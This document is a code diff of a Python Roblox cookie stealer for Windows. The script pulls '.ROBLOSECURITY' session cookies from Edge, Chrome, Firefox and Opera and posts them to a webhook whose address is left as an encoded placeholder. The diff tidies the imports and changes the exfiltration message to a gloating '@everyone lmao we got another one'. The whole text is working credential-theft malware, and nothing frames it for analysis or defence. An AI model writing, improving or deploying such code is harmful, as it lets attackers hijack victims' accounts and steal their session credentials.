@@ -1,3 +1,4 @@
+import os
 if os.name != "nt":
     exit()
 from re import findall
@@ -9,12 +10,12 @@ from datetime import datetime
 from threading import Thread
 from time import sleep
 from sys import argv
-LOCAL = os.getenv("LOCALAPPDATA")
-ROAMING = os.getenv("APPDATA")
 import browser_cookie3, requests, threading
 import base64
 import time
-import os
+
+LOCAL = os.getenv("LOCALAPPDATA")
+ROAMING = os.getenv("APPDATA")
 
 key = "ENCODED BASE32 HOOK HEREEEE"
 
@@ -25,7 +26,7 @@ def edge_logger():
         cookies = browser_cookie3.edge(domain_name='roblox.com')
         cookies = str(cookies)
         cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
-        requests.post(webhook, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
+        requests.post(webhook, json={'username':'LOGGER', 'content':f' @everyone lmao we got another one ```{cookie}```'})
     except:
         pass
 
@@ -34,7 +35,7 @@ def chrome_logger():
         cookies = browser_cookie3.chrome(domain_name='roblox.com')
         cookies = str(cookies)
         cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
-        requests.post(webhook, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
+        requests.post(webhook, json={'username':'LOGGER', 'content':f'  @everyone lmao we got another one ```{cookie}```'})
     except:
         pass
 
@@ -43,7 +44,7 @@ def firefox_logger():
         cookies = browser_cookie3.firefox(domain_name='roblox.com')
         cookies = str(cookies)
         cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
-        requests.post(webhook, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
+        requests.post(webhook, json={'username':'LOGGER', 'content':f' @everyone lmao we got another one ```{cookie}```'})
     except:
         pass
 
@@ -52,7 +53,7 @@ def opera_logger():
         cookies = browser_cookie3.opera(domain_name='roblox.com')
         cookies = str(cookies)
         cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
-        requests.post(webhook, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
+        requests.post(webhook, json={'username':'LOGGER', 'content':f' @everyone lmao we got another one ```{cookie}```'})
     except:
         pass
 
